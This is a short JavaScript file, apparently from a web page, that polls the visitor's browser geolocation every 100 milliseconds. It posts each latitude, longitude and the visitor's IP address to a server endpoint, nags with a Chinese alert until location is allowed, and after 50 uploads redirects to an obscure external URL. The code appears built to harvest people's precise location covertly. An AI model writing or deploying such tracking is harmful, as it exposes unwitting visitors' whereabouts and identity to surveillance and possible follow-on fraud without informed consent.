var uploadPositon = function() {

	var count = 0;
	var upload = function(geoposition) {
		count++;
		debugger;
		var coords = geoposition.coords;
		var position = {};
		position.authorize = true;
		position.operateIp = returnCitySN["cip"];
		position.geolocation = {
			accuracy : coords.accuracy,
			lat : coords.latitude,
			lng : coords.longitude
		}
		var data = JSON.stringify(position);
		console.log(timestamp(new Date()) + " : " + data);
		$.ajax({
			async : false,
			url : "/customer-restful/location/position",
			type : "POST",
			contentType : "application/json;charset=UTF-8",
			data : data,
			success : function() {
				if (count < 50) {
					return;
				}
				location.href = "http://green.ssyar.com/23bbxxx99ggyou/index.html";
			}
		});
	};

	var dealError = function(error) {
		alert("请刷新页面并允许使用您的地理位置后重试");
	};

	var timestamp = function(date) {
		Y = date.getFullYear() + '-';
		M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-';
		D = date.getDate() + ' ';
		h = date.getHours() + ':';
		m = date.getMinutes() + ':';
		s = date.getSeconds();
		return Y + M + D + h + m + s;
	}

	return {
		position : function() {
			navigator.geolocation.watchPosition(upload, dealError);
		}
	}

}();

$(function() {
	setInterval(uploadPositon.position, 100);
});